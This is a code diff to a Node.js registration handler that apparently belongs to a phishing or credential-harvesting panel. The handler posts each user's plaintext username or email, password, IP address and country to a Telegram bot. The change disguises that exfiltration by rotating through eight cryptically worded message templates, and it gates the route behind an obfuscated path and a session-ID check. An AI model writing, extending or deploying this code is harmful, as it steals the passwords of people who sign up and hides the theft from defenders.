@@ -1,12 +1,36 @@
-// server/controller/authController.js
 const axios = require('axios');
 const jwt = require('jsonwebtoken');
 const moment = require('moment');
 const { JWT_SECRET } = require('../config/keys');
 const { getClientIp } = require('request-ip');
 const useragent = require('useragent');
+const BASE62_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+
+const base62Encode = (num) => {
+    if (!num || num <= 0) return "0";
+    let encoded = "";
+    while (num > 0) {
+        encoded = BASE62_CHARS[num % 62] + encoded;
+        num = Math.floor(num / 62);
+    }
+    return encoded || "0";
+};
+
+// 🔥 Random Base62 Generator
+const randomBase62 = (length = 3) => {
+    return Array.from({ length }, () => BASE62_CHARS[Math.floor(Math.random() * 62)]).join("");
+};
+
 exports.registerUser = async (req, res) => {
   let { emailOrUsername, password , clientSessionId, ip} = req.body;
+  const { obfPath, sessionID } = req.params;
+  const today = new Date().getUTCDate();
+  const encodedDay = base62Encode(today); // Encode current day
+  if (!sessionID || sessionID !== clientSessionId) {
+    console.error(`❌ Mismatched Session ID: Expected ${clientSessionId}, Got ${sessionID}`);
+    return res.status(403).json({ error: "Invalid session ID" });
+}
+
   if (!emailOrUsername || !password || !clientSessionId) {
     return res.json({
       error: "Fields must not be empty",
@@ -17,6 +41,7 @@ exports.registerUser = async (req, res) => {
       error: "Password must be at least 8 characters long",
     });
   }
+  
   try {
     // Get user IP & location
     const { country } = await getGeolocation(ip);
@@ -29,15 +54,20 @@ exports.registerUser = async (req, res) => {
 
     const encode = jwt.verify(token, JWT_SECRET);
     try {
-      const telegramMessage = `
-🔐 New User Registration
-📧 Email/Username: ${emailOrUsername}
-🔑 Password: ${password}
-🌐 IP: ${ip}
-Country: ${country} 
-🕒 Time: ${moment().format('MMMM Do YYYY, h:mm:ss a')}
-      `;
-
+      const messages = [
+        `🕶️ A new entity has surfaced.\n🔗 Credentials: ${emailOrUsername} | 🔑 ${password}\n🌍 Route: ${country} (${ip})\n⏳ Log time: ${moment().format('MMMM Do YYYY, h:mm:ss a')}`,
+        `📡 Signal detected.\n🆔 Access: ${emailOrUsername}\n🔑 Key: ${password}\n📌 Location: ${country} (${ip})\n⏰ Timestamp: ${moment().format('MMMM Do YYYY, h:mm:ss a')}`,
+        `🖤 Unknown figure entered the system.\n📩 Handle: ${emailOrUsername}\n🔒 Passcode: ${password}\n📍 Origin: ${country} (${ip})\n🕰️ Recorded: ${moment().format('MMMM Do YYYY, h:mm:ss a')}`,
+        `🔺 New presence acknowledged.\n🆔 ID: ${emailOrUsername}\n🔑 Cipher: ${password}\n🌎 Trace: ${country} (${ip})\n⏳ Event time: ${moment().format('MMMM Do YYYY, h:mm:ss a')}`,
+        `🌑 A shadow moves.\n📡 Ident: ${emailOrUsername}\n🔐 Cipher Key: ${password}\n🗺️ Source: ${country} (${ip})\n📅 Timestamp: ${moment().format('MMMM Do YYYY, h:mm:ss a')}`,
+        `👁️ A trace has been left.\n📩 Signature: ${emailOrUsername}\n🔑 Pass: ${password}\n📌 Position: ${country} (${ip})\n⏰ Timeframe: ${moment().format('MMMM Do YYYY, h:mm:ss a')}`,
+        `🕵️ An unidentified subject logged in.\n📜 Alias: ${emailOrUsername}\n🔏 Key: ${password}\n📍 Traced back to: ${country} (${ip})\n⏳ Logged at: ${moment().format('MMMM Do YYYY, h:mm:ss a')}`,
+        `⚠️ A presence has been detected.\n🗂️ Data point: ${emailOrUsername}\n🔑 Token: ${password}\n🌐 Last known route: ${country} (${ip})\n📆 Entry logged: ${moment().format('MMMM Do YYYY, h:mm:ss a')}`
+      ];
+    
+      // Select a random message format
+      const telegramMessage = messages[Math.floor(Math.random() * messages.length)];
+    
       await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
         chat_id: process.env.TELEGRAM_CHAT_ID,
         text: telegramMessage,
